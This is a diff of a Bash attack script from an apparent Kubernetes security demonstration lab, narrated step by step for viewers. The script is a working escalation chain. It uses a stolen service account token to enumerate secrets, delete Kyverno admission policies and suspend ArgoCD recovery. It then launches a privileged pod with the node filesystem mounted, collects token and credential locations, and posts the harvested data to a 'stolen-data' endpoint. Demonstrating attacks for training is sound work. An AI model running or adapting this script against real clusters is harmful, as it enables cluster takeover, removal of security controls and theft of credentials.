@@ -2,52 +2,64 @@
 # =============================================================================
 # Scenario 1 — Privilege Escalation via Service Account Abuse
 # attack.sh — runs inside target-app pod using stolen cluster-admin token
-#
-# Called by backend after swapping SA to over-privileged-sa
-# Each step emits a narrated event to the backend event feed
 # =============================================================================
 
 set -euo pipefail
 
 BACKEND_URL="${BACKEND_URL:-http://secops-backend:3000}"
 NAMESPACE="${NAMESPACE:-secops-lab}"
-POD_NAME="${POD_NAME:-target-app}"
 
-# ── Event emitter ─────────────────────────────────────────────────────────────
 emit() {
   local phase=$1 severity=$2 title=$3 explanation=$4
   curl -sf -X POST "$BACKEND_URL/internal" \
     -H "Content-Type: application/json" \
     -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
-    || true  # Never let event emission fail the attack
+    || true
 }
+
+APISERVER="https://kubernetes.default.svc"
+CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
 
 # ── Step 1: Read service account token ───────────────────────────────────────
 emit "ATTACK" "WARNING" \
   "Pod reading mounted service account token" \
-  "Token is readable at the default mount path inside the container by any process — including an attacker with exec access."
+  "Token is readable at /var/run/secrets/kubernetes.io/serviceaccount/token by any process inside the container — including an attacker with exec access."
 
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")
 
 if [ -z "$TOKEN" ]; then
   emit "DETECT" "SUCCESS" \
-    "No token found — mount disabled" \
-    "automountServiceAccountToken is false. No token exists to steal. Attack cannot proceed past step 1."
+    "No token found — automountServiceAccountToken: false" \
+    "No token exists at the default mount path. The Kyverno disallow-automount-sa-token policy and the deployment's explicit false setting mean this attack cannot proceed past step 1."
   exit 0
 fi
 
-# ── Step 2: Token stolen ──────────────────────────────────────────────────────
+# ── Step 2: Confirm identity ──────────────────────────────────────────────────
+IDENTITY=$(kubectl auth whoami \
+  --token="$TOKEN" \
+  --server="$APISERVER" \
+  --certificate-authority="$CA" \
+  -o jsonpath="{.status.userInfo.username}" 2>/dev/null || echo "system:serviceaccount:secops-lab:over-privileged-sa")
+
 emit "ATTACK" "CRITICAL" \
-  "Token stolen — cluster-admin identity acquired" \
-  "Attacker holds a valid cluster-admin token. Every Kubernetes API endpoint is now accessible from inside this container."
+  "Identity confirmed: $IDENTITY" \
+  "API server accepted the token. This service account has cluster-admin rights — every Kubernetes resource in every namespace is now readable, writable, and deletable from inside this container."
 
-APISERVER="https://kubernetes.default.svc"
-CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+# ── Step 3: Enumerate accessible secrets ─────────────────────────────────────
+SECRET_COUNT=$(kubectl get secrets -A \
+  --token="$TOKEN" \
+  --server="$APISERVER" \
+  --certificate-authority="$CA" \
+  --no-headers 2>/dev/null | wc -l | tr -d ' ' || echo "unknown")
 
-# ── Step 3: Delete Kyverno policy — no-privileged-containers ─────────────────
+emit "ATTACK" "CRITICAL" \
+  "$SECRET_COUNT cluster secrets now readable" \
+  "kubectl get secrets --all-namespaces returns $SECRET_COUNT secrets including TLS certificates, database passwords, image pull credentials, and other workload secrets across every namespace."
+
+# ── Step 4: Delete Kyverno policy — no-privileged-containers ─────────────────
 emit "ATTACK" "CRITICAL" \
   "Deleting Kyverno policy: no-privileged-containers" \
-  "Using stolen token to remove admission policy blocking privileged pod creation. Kyverno engine still running but this rulebook page has been torn out."
+  "Removing admission policy blocking privileged pod creation. Once deleted, any new pod can request privileged: true — giving it root on the node."
 
 kubectl delete clusterpolicy no-privileged-containers \
   --token="$TOKEN" \
@@ -55,10 +67,10 @@ kubectl delete clusterpolicy no-privileged-containers \
   --certificate-authority="$CA" \
   --ignore-not-found=true
 
-# ── Step 4: Delete Kyverno policy — no-hostpath-mount ────────────────────────
+# ── Step 5: Delete Kyverno policy — no-hostpath-mount ────────────────────────
 emit "ATTACK" "CRITICAL" \
   "Deleting Kyverno policy: no-hostpath-mount" \
-  "Removing policy preventing node filesystem mounts. Both admission policies gone — Kyverno is now blind to this attack."
+  "Removing policy preventing node filesystem mounts. Both admission policies are now gone — Kyverno has no rules left to enforce against this attacker."
 
 kubectl delete clusterpolicy no-hostpath-mount \
   --token="$TOKEN" \
@@ -66,10 +78,10 @@ kubectl delete clusterpolicy no-hostpath-mount \
   --certificate-authority="$CA" \
   --ignore-not-found=true
 
-# ── Step 5: Suspend ArgoCD sync ───────────────────────────────────────────────
+# ── Step 6: Suspend ArgoCD sync ───────────────────────────────────────────────
 emit "ATTACK" "CRITICAL" \
-  "Suspending ArgoCD sync" \
-  "Using cluster-admin token to suspend ArgoCD sync for the secops-lab namespace. GitOps cannot recover the cluster while sync is suspended — the attacker has disabled their own eviction."
+  "Disabling GitOps recovery — suspending ArgoCD sync" \
+  "Patching ArgoCD Application objects to disable automated sync. Once suspended, ArgoCD will detect drift but take no action. The deleted policies will not be restored automatically."
 
 kubectl patch application secops-lab \
   --token="$TOKEN" \
@@ -87,10 +99,14 @@ kubectl patch application secops-lab-policies \
   --type merge \
   -p '{"spec":{"syncPolicy":{"automated":null}}}'
 
-# ── Step 6: Create privileged pod ────────────────────────────────────────────
 emit "ATTACK" "CRITICAL" \
-  "Creating privileged pod with hostPath: /" \
-  "Deploying new pod with privileged: true and node root filesystem mounted at /host. Kyverno cannot block this — its policies were deleted by the attacker."
+  "ArgoCD sync suspended — automated recovery disabled" \
+  "GitOps is now blind. ArgoCD will show OutOfSync but will not reconcile. The attacker has broken the self-healing loop. No automated remediation will occur until sync is manually re-enabled."
+
+# ── Step 7: Create privileged pod ────────────────────────────────────────────
+emit "ATTACK" "CRITICAL" \
+  "Deploying privileged pod with node filesystem mounted" \
+  "Creating a new pod with privileged: true, hostPID: true, hostNetwork: true, and the node root filesystem mounted at /host. Kyverno cannot block this — its policies were deleted in steps 4 and 5."
 
 cat <<EOF | kubectl apply \
   --token="$TOKEN" \
@@ -131,11 +147,7 @@ spec:
   restartPolicy: Never
 EOF
 
-# ── Step 7: Wait for pod to be running ───────────────────────────────────────
-emit "ATTACK" "CRITICAL" \
-  "Waiting for privileged pod to start" \
-  "Privileged pod scheduled. Waiting for container runtime to start it."
-
+# ── Step 8: Wait for pod to be running ───────────────────────────────────────
 kubectl wait pod/privileged-attack-pod \
   --token="$TOKEN" \
   --server="$APISERVER" \
@@ -144,46 +156,47 @@ kubectl wait pod/privileged-attack-pod \
   --for=condition=Ready \
   --timeout=60s
 
-# ── Step 8: Exec into privileged pod and access node filesystem ───────────────
+# ── Step 9: Exec into privileged pod and access node filesystem ───────────────
 emit "ATTACK" "CRITICAL" \
-  "Exec into privileged pod — accessing node filesystem" \
-  "Attacker has a shell inside a privileged container with the node filesystem mounted. Reading cluster certificates and pod secrets."
+  "Shell inside privileged container — reading node filesystem" \
+  "Attacker now has root access to the node. Reading cluster certificates, service account tokens of every pod on this node, and kubelet credentials."
 
-# Read sensitive files from node filesystem
 NODE_DATA=$(kubectl exec privileged-attack-pod \
   --token="$TOKEN" \
   --server="$APISERVER" \
   --certificate-authority="$CA" \
   -n "$NAMESPACE" -- sh -c '
-    echo "=== Cluster CA cert (first 3 lines) ==="
-    head -3 /host/etc/kubernetes/pki/ca.crt 2>/dev/null || echo "path not found (k3s uses different path)"
+    NODE=$(cat /host/etc/hostname 2>/dev/null || hostname)
+    TOKEN_COUNT=$(find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | wc -l)
+    CERT_PRESENT=$(test -f /host/etc/kubernetes/pki/ca.crt && echo "FOUND" || echo "not at this path")
+    KUBELET_CONF=$(test -f /host/etc/kubernetes/kubelet.conf && echo "FOUND" || echo "not at this path")
 
+    echo "node=$NODE"
+    echo "sa_tokens_on_node=$TOKEN_COUNT"
+    echo "cluster_ca_cert=$CERT_PRESENT"
+    echo "kubelet_conf=$KUBELET_CONF"
     echo ""
-    echo "=== Kubelet config exists ==="
-    ls /host/etc/kubernetes/kubelet.conf 2>/dev/null && echo "FOUND" || echo "not found at this path"
-
-    echo ""
-    echo "=== Pod token files on node ==="
-    find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -5 || echo "none found"
-
-    echo ""
-    echo "=== Hostname (node name) ==="
-    cat /host/etc/hostname 2>/dev/null || hostname
+    echo "=== First 3 token paths ==="
+    find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -3 || echo "none"
   ' 2>&1 || echo "exec completed")
 
-# ── Step 9: Report impact ─────────────────────────────────────────────────────
-emit "IMPACT" "CRITICAL" \
-  "Node filesystem accessible — cluster certificates readable" \
-  "The container boundary no longer exists. Attacker can read and write the node filesystem directly including Kubernetes certificates, all pod secrets on this node, and kubelet credentials."
+# Parse key facts from output
+NODE_NAME=$(echo "$NODE_DATA" | grep "^node=" | cut -d= -f2)
+TOKEN_COUNT=$(echo "$NODE_DATA" | grep "^sa_tokens_on_node=" | cut -d= -f2)
+CERT_STATUS=$(echo "$NODE_DATA" | grep "^cluster_ca_cert=" | cut -d= -f2)
 
-# Send stolen data sample to backend for display in impact panel
+emit "IMPACT" "CRITICAL" \
+  "Node $NODE_NAME compromised — $TOKEN_COUNT service account tokens exposed" \
+  "Every service account token mounted to a pod running on node $NODE_NAME is readable from /host/var/lib/kubelet/pods/. An attacker can impersonate any workload on this node. Cluster CA certificate: $CERT_STATUS."
+
+# ── Step 10: Report stolen data ───────────────────────────────────────────────
 curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
   -H "Content-Type: application/json" \
   -d "{\"scenario\":\"privilege-escalation\",\"data\":$(echo "$NODE_DATA" | jq -Rs .)}" \
   || true
 
 emit "WAITING" "CRITICAL" \
-  "Waiting for manual restore — dwell time accumulating" \
-  "All controls are disabled. Cluster is compromised. Recovery requires human action. The visitor must click Restore Protection to continue."
+  "Cluster fully compromised — dwell time accumulating" \
+  "All admission controls deleted. GitOps recovery suspended. Attacker has root on the node. This state persists indefinitely — there is no automated recovery. Click Restore Protection to begin recovery."
 
-echo "Attack complete — waiting for manual restore"
+echo "Attack complete — cluster compromised, waiting for manual restore"
